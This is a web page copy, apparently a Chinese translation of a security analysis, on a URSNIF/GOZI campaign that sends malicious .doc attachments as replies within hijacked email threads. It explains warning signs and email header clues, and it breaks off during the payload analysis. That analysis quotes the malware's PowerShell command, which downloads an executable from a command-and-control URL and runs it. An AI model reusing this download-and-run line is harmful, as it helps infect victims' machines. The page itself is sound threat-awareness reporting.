+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+
+  
+    
+
+
+
+<article class="post">
+  <h1>渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 - iYouPort</h1>
+  <!-- Look the author details up from the site config. -->
+  
+
+  <div>
+    <span class="date">
+      2018-10-30
+    </span>
+
+    <!-- Output author details if some exist. -->
+    
+      
+    
+
+
+    <ul class="tag">
+      <li>
+        <a href="https://nodebe4.github.io/oped2/categories/#iYouPort">
+          iYouPort
+        </a>
+      </li>
+    </ul>
+
+    
+        <span>
+            <!-- Personal Info. -->
+            <a href="https://www.iyouport.org/%e6%b8%94%e8%89%ba%e6%ad%a3%e5%9c%a8%e5%8d%87%e7%ba%a7%ef%bc%9aursnif-%e6%81%b6%e6%84%8f%e8%bd%af%e4%bb%b6%e6%96%b0%e5%8f%98%e7%a7%8d%e9%80%9a%e8%bf%87%e5%9b%9e%e5%a4%8d%e9%82%ae%e4%bb%b6%e5%8d%b3/" style="font-size:14px;">原文</a>
+        </span>
+    
+
+    <span style="float: right;" title="iYouPort的其它文章">
+      <a style="font-size: 14px;" rel="nofollow" href="#sametag" class="tags">#iYouPort 的其它文章</a>
+    </span>
+
+  </div>
+
+  <div class="entry">
+    
+    
+    
+    <article class="post-7777 post type-post status-publish format-standard has-post-thumbnail hentry category-knowledge-node category-289 category-54 category-67 tag-phishing tag-security tag-selfcare tag-technology tag-ursnif" id="post-7777">
+  <header class="entry-header">
+    <h1 class="entry-title" id="ursnif--"> 渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 </h1>
+  </header>
+  <div class="entry-meta">
+<span class="byline"> <a href="https://www.iyouport.org/author/don-evans/" rel="author" title="由McCaffrey发布"> McCaffrey </a> </span> <span class="cat-links"> <a href="https://www.iyouport.org/category/knowledge-node/" rel="category tag"> Knowledge Node </a> , <a href="https://www.iyouport.org/category/%e6%8a%80%e6%9c%af/" rel="category tag"> 技术 </a> , <a href="https://www.iyouport.org/category/%e6%8a%80%e6%9c%af%e9%98%b2%e8%ba%ab-%e8%87%aa%e6%88%91%e4%bf%9d%e6%8a%a4%e6%96%b9%e6%b3%95/" rel="category tag"> 技术防身/自我保护方法 </a> , <a href="https://www.iyouport.org/category/%e7%bb%99%e8%a1%8c%e5%8a%a8%e8%80%85%e7%9a%84%e6%8a%a4%e8%ba%ab%e7%ac%a6%e5%92%8c%e6%ad%a6%e5%99%a8/" rel="category tag"> 给行动者的护身符和武器 </a> </span> <span class="published-on">         <time class="entry-date published" datetime="2018-10-30T13:49:40+08:00"> 2018年10月30日 </time>
+         <time class="updated" datetime="2019-08-10T13:58:12+08:00"> 2019年8月10日 </time>
+ </span> <span class="word-count"> 4 Minutes </span>
+  </div>
+  <div class="entry-content">
+    <ul>
+      <li><span style="color: #00ccff;"> <em>
+      <strong>
+       攻击者正在采取更为复杂的网络钓鱼。由于网络钓鱼攻击依赖于社交工程技术，因此它们往往非常有效。这些技术会创建一些可信的场景或对话，从而诱使用户泄漏信息，或下载恶意软件。在本文的案例中，最棘手的问题在于发件人是真实的用户……
+      </strong>
+     </em> </span></li>
+    </ul>
+    <p><img alt="" class="aligncenter size-full wp-image-7778 jetpack-lazy-image" data-lazy-sizes="(max-width: 1000px) 100vw, 1000px" data-lazy-src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/0-39.jpeg?resize=1000%2C600&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/0-39.jpeg?w=1000&amp;ssl=1 1000w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/0-39.jpeg?resize=300%2C180&amp;ssl=1 300w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/0-39.jpeg?resize=768%2C461&amp;ssl=1 768w" data-recalc-dims="1" height="600" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/0-39.jpeg?resize=1000%2C600&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="1000" />       <noscript>
+ <img alt="" class="aligncenter size-full wp-image-7778" data-recalc-dims="1" height="600" sizes="(max-width: 1000px) 100vw, 1000px" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/0-39.jpeg?resize=1000%2C600&amp;ssl=1" srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/0-39.jpeg?w=1000&amp;ssl=1 1000w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/0-39.jpeg?resize=300%2C180&amp;ssl=1 300w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/0-39.jpeg?resize=768%2C461&amp;ssl=1 768w" width="1000" /> 
+      </noscript>
+</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="ca43">大多数网络钓鱼活动，其本质非常简单，并且易于发现。攻击者往往会发送一些看似合法的电子邮件，并在其文本中嵌入恶意链接，或在邮件中添加恶意附件。然而，趋势科技在今年9月监测到的恶意邮件活动却表明，攻击者正在采取更为复杂的网络钓鱼形式。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="c573"><a class="bj cu ld le lf lg" href="https://ctt.ac/NH_r1"> <strong class="jy lh">
+     该恶意活动会盗取电子邮件账户
+    </strong> </a> <strong class="jy lh">
+    ，并对邮箱中已有的邮件内容进行回复，在回复的内容中附带恶意软件
+   </strong> 。对已有邮件的回复，实际上是连续通信中的一部分，因此这种特殊的钓鱼方式难以被用户发现，也难以检测。通常，受害者都没有意识到他们正在遭受钓鱼邮件的威胁。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="ada0">这些攻击与今年早些时候 Talos 发现的 <a class="bj cu ld le lf lg" href="http://blog.talosintelligence.com/2018/03/gozi-isfb-remains-active-in-2018.html"> URSNIF/GOZI 恶意邮件 </a> 活动非常相似，该恶意活动使用暗云僵尸网络中部分被劫持的计算机向已有邮件发送回信，很可能是 URSNIF/GOZI 恶意邮件活动的升级版本或演变版本。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="0727">根据迄今为止收集到的数据，趋势科技发现该恶意活动主要影响北美和欧洲地区， <strong class="jy lh">
+    同时在亚洲和拉丁美洲地区也发现了类似的攻击。
+   </strong></p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="6cf6">本次恶意活动的主要目标是教育、金融和能源行业。然而，此次恶意活动还影响到了其他行业，包括房地产、交通运输、制造业和政府。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="2289"><strong class="jy lh">
+    捕获样本
+   </strong></p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="1882">趋势科技发现了该恶意活动的一个示例，并对电子邮件的内容进行了截图，如下所示：</p>
+    <figure aria-describedby="caption-attachment-7779" class="wp-caption aligncenter" id="attachment_7779" style="width: 793px">
+<img alt="" class="size-full wp-image-7779 jetpack-lazy-image" data-lazy-sizes="(max-width: 793px) 100vw, 793px" data-lazy-src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/1-10.png?resize=793%2C637&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/1-10.png?w=793&amp;ssl=1 793w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/1-10.png?resize=300%2C241&amp;ssl=1 300w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/1-10.png?resize=768%2C617&amp;ssl=1 768w" data-recalc-dims="1" height="637" src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/1-10.png?resize=793%2C637&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="793" />       <noscript>
+ <img alt="" class="size-full wp-image-7779" data-recalc-dims="1" height="637" sizes="(max-width: 793px) 100vw, 793px" src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/1-10.png?resize=793%2C637&amp;ssl=1" srcset="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/1-10.png?w=793&amp;ssl=1 793w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/1-10.png?resize=300%2C241&amp;ssl=1 300w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/1-10.png?resize=768%2C617&amp;ssl=1 768w" width="793" /> 
+      </noscript>
+      <figcaption class="wp-caption-text" id="caption-attachment-7779">
+Figure 1. Example of a malicious email that is used to reply to a conversation
+      </figcaption>
+    </figure>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="16a5"><strong class="jy lh">
+    由于发件人是一位熟悉的人，并且邮件也是往来对话中的一部分，因此作为收件人，很容易会相信这只是对此前邮件内容的另一封回复邮件。此外，该回复的标题和语法似乎都是正确的，甚至在电子邮件的末尾还附带了签名
+   </strong> 。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="c52c">当然，如果仔细检查，会发现这封电子邮件中存在一些可疑的地方。最明显之处在于，使用的语言从法语变成了英语。此外，恶意电子邮件中的签名与合法电子邮件的签名是不同的。最后还有一点，就是该邮件的内容是通用的，所以可能会偏离原来的交流内容。尽管不能通过这些因素，直接判断出这封邮件是恶意的，但至少能够提起警惕。然而，如果不经仔细阅读，这些小细节可能难以发现，特别是那些每天有大量邮件往来的人。</p>
+    <figure aria-describedby="caption-attachment-7780" class="wp-caption aligncenter" id="attachment_7780" style="width: 1182px">
+<img alt="" class="size-full wp-image-7780 jetpack-lazy-image" data-lazy-sizes="(max-width: 1100px) 100vw, 1100px" data-lazy-src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/2-10.png?resize=1100%2C597&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/2-10.png?w=1182&amp;ssl=1 1182w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/2-10.png?resize=300%2C163&amp;ssl=1 300w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/2-10.png?resize=768%2C417&amp;ssl=1 768w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/2-10.png?resize=1024%2C556&amp;ssl=1 1024w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/2-10.png?resize=1100%2C597&amp;ssl=1 1100w" data-recalc-dims="1" height="597" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/2-10.png?resize=1100%2C597&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="1100" />       <noscript>
+ <img alt="" class="size-full wp-image-7780" data-recalc-dims="1" height="597" sizes="(max-width: 1100px) 100vw, 1100px" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/2-10.png?resize=1100%2C597&amp;ssl=1" srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/2-10.png?w=1182&amp;ssl=1 1182w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/2-10.png?resize=300%2C163&amp;ssl=1 300w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/2-10.png?resize=768%2C417&amp;ssl=1 768w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/2-10.png?resize=1024%2C556&amp;ssl=1 1024w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/2-10.png?resize=1100%2C597&amp;ssl=1 1100w" width="1100" /> 
+      </noscript>
+      <figcaption class="wp-caption-text" id="caption-attachment-7780">
+Figure 2. Comparison between the malicious email and a legitimate one. Note the difference in language and the changed signature
+      </figcaption>
+    </figure>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="cf64"><strong class="jy lh">
+    擦亮眼睛！分析电子邮件头部信息
+   </strong></p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="2a7c">在对电子邮件的头部信息进行检查后，发现了该攻击的一些有趣之处。</p>
+    <figure aria-describedby="caption-attachment-7781" class="wp-caption aligncenter" id="attachment_7781" style="width: 989px">
+<img alt="" class="size-full wp-image-7781 jetpack-lazy-image" data-lazy-sizes="(max-width: 989px) 100vw, 989px" data-lazy-src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/3-9.png?resize=989%2C489&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/3-9.png?w=989&amp;ssl=1 989w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/3-9.png?resize=300%2C148&amp;ssl=1 300w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/3-9.png?resize=768%2C380&amp;ssl=1 768w" data-recalc-dims="1" height="489" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/3-9.png?resize=989%2C489&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="989" />       <noscript>
+ <img alt="" class="size-full wp-image-7781" data-recalc-dims="1" height="489" sizes="(max-width: 989px) 100vw, 989px" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/3-9.png?resize=989%2C489&amp;ssl=1" srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/3-9.png?w=989&amp;ssl=1 989w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/3-9.png?resize=300%2C148&amp;ssl=1 300w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/3-9.png?resize=768%2C380&amp;ssl=1 768w" width="989" /> 
+      </noscript>
+      <figcaption class="wp-caption-text" id="caption-attachment-7781">
+Figure 3. The anonymized email header of the malicious message (click the image to zoom in)
+      </figcaption>
+    </figure>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="c8b2">⚠️ 在这里， <strong class="jy lh">
+    有3个地方需要注意
+   </strong> ：</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="cd3f">1、通常，恶意邮件都会伪造发件人，会使用 “Return-Path” 或 “Reply-To” 的 SMTP 头部，以便收件人能够将邮件直接回复给恶意攻击者。而在观察到的示例中，没有这两个头部信息，并且所有回复都会发送至发件人（也就是被攻陷的邮箱账户）。这就说明攻击者可能已经通过了发件人邮箱的身份验证。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="f956">2、“In-Reply-To”头部（或其他类似的 SMTP 头部字段）表示这封邮件是对已有电子邮件通信的回复。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="1915">3、这封电子邮件的第一跳（The First Hop）来自于 “rrcs-50–74–218–2[.]nyc[.]biz[.]rr[.]com”，这个地址对于家庭用户来说并不常见。对于组织用户来说，除非邮件是来自远程的服务，否则邮件都应该是从组织内部的服务器发送（例如：一个“ <a class="bj cu ld le lf lg" href="http://sender.co.ca/"> sender.co.ca </a> ”域内的主机）。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="3872">考虑到这些因素，可以看出这封电子邮件是从美国发出的。而根据示例中发件人邮箱的域名 .ca，这封邮件应该是发自加拿大。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="3874">经过进一步的调查，发现该域名在2018年9月期间使用了多个电子邮件地址，发送了大量不同的电子邮件。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="ce16">攻击者经常会将附件的文件名与发件人的组织名称相对应，这样就有可能使得邮件看起来更加真实。附件文件名的格式通常是[发件人所在组织]+[与此前通信相关的一个动词，例如“查询”或“请求”].doc，或者就是简单的 [发件人所在组织].doc。这样的附件，使这封邮件不容易被人怀疑。在部分恶意活动中，我们看到附件使用了通用的文件名，例如“查询”、“声明”和“请求”。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="b306">根据邮件的标题，可以假定，攻击者通过某种方式获得了真实的邮箱账户，并且将该邮箱账户用于类似 BEC 的骗局之中。考虑到其运作方式和使用的技术，怀疑这一新的恶意邮件活动是 URSNIF/GOZI 恶意邮件活动的一部分。发送方的IP地址，可能是僵尸网络中被感染的主机之一。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="fce1"><strong class="jy lh">
+    对 Payload 的分析
+   </strong></p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="95ad">一旦用户双击电子邮件中的恶意.doc附件，就会调用 PowerShell 从 C&amp;C 服务器下载最新版本的 URSNIF（检测为 TSPY_URSNIF.THAOOCAH）恶意软件：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="7e24"><em class="jx">
+     powershell $VWc=new-object Net.WebClient;$wIt=’http: //t95dfesc2mo5jr. com/RTT/opanskot.php?l=targa2.tkn’.Split(‘@’);$jzK = ‘369’;$Aiz=$env:public+’\’+$jzK+’.exe’;foreach($fqd in $wIt){try{$VWc.DownloadFile($fqd, $Aiz);Invoke-Item $Aiz;break;}catch{}}
+    </em></li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="175a">该文件是恶意软件的主要加载程序。但是， <strong class="jy lh">
+    在执行其例程之前，它首先会检查操作系统版本，只允许在 Microsoft 操作系统上执行，特别是 Windows Vista 及以上版本。此外，它会避免在某些语言环境中运行，例如 CN（中国）和 RU（俄罗斯）
+   </strong> 。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="9802">主加载器负责管理整个执行过程，并将事件记录在文本文件中：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="c06e">%User Temp%\{temp filename}.bin</li>
+    </ul>
+    <figure aria-describedby="caption-attachment-7782" class="wp-caption aligncenter" id="attachment_7782" style="width: 1186px">
+<img alt="" class="size-full wp-image-7782 jetpack-lazy-image" data-lazy-sizes="(max-width: 1100px) 100vw, 1100px" data-lazy-src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/4-4.png?resize=1100%2C213&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/4-4.png?w=1186&amp;ssl=1 1186w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/4-4.png?resize=300%2C58&amp;ssl=1 300w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/4-4.png?resize=768%2C149&amp;ssl=1 768w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/4-4.png?resize=1024%2C199&amp;ssl=1 1024w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/4-4.png?resize=1100%2C213&amp;ssl=1 1100w" data-recalc-dims="1" height="213" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/4-4.png?resize=1100%2C213&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="1100" />       <noscript>
+ <img alt="" class="size-full wp-image-7782" data-recalc-dims="1" height="213" sizes="(max-width: 1100px) 100vw, 1100px" src="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/4-4.png?resize=1100%2C213&amp;ssl=1" srcset="https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/4-4.png?w=1186&amp;ssl=1 1186w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/4-4.png?resize=300%2C58&amp;ssl=1 300w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/4-4.png?resize=768%2C149&amp;ssl=1 768w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/4-4.png?resize=1024%2C199&amp;ssl=1 1024w, https://i1.wp.com/www.iyouport.org/wp-content/uploads/2019/08/4-4.png?resize=1100%2C213&amp;ssl=1 1100w" width="1100" /> 
+      </noscript>
+      <figcaption class="wp-caption-text" id="caption-attachment-7782">
+Figure 4. Logs of the malware’s loader (click the image to zoom in)
+      </figcaption>
+    </figure>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="049c">它会从 C&amp;C 服务器下载其他模块，并将它们保存在注册表文件夹 HKEY_CURRENT_USER\Software\AppDataLow\Software\Microsoft\3A861D62–51E0–15700F2219A4中。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="8167">下图展示了创建的注册表项，以及包含脚本和二进制文件的条目。</p>
+    <figure aria-describedby="caption-attachment-7783" class="wp-caption aligncenter" id="attachment_7783" style="width: 389px">
